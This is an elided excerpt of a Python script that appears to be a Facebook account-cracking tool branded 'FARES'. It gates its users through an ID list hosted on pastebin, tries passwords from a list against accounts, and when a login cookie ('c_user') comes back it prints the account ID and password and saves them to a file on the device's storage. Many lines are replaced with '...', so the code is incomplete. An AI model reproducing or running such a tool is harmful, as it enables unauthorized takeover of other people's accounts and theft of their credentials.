...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100057363322158")
from bs4 import BeautifulSoup
def subc():
   uuid=str(os.geteuid())+str(os.getlogin())
   id="|".join(uuid)
   ses=requests.get("https://pastebin.com/HmvKegkb").text
   if id in ses:
   	pass
   else:
   	print("Your Id "+id)
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  𝔽𝔸ℝ𝔼𝕊   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  𝔽𝔸ℝ𝔼𝕊 \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[𝔽𝔸ℝ𝔼𝕊-CP]---------------------[×]\nﻢﻗﺮﻟﺍ : '+uid+'\nﻱﺪﻳﻻﺍ   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/𝔽𝔸ℝ𝔼𝕊-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
